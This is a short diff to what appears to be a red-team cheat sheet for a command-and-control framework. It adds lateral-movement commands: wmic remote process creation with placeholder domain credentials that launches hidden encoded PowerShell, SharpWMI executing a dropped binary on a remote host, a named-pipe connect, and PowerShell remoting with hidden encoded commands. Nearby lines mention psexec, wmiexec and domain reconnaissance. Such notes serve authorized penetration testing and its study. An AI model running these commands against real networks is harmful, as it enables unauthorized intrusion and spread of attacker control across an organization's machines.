@@ -45,6 +45,13 @@ SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { File
 --Grunt Service Binary --
 --Connect localhost rastasvc--
 --pesexec or wmiexec --powershell
+wmic /node:"hostname" /user:"domain.io\n.lamb" /password:"pass" process call create “powershell -Sta -Nop -Window Hidden -EncodedCommand “”
+
+SharpWMI /command:"action=exec computername=hostname command=\"C:\Temp\rasta3.exe"
+
+connect hostname pipensvc
+
+PowerShellRemotingCommand wkstn-4945 "powershell.exe -Sta -Nop -Window Hidden -EncodedCommand '' "
 
 ---------------------------------------------------------------------------------------
 #DOMAIN RECONNAISSANCE
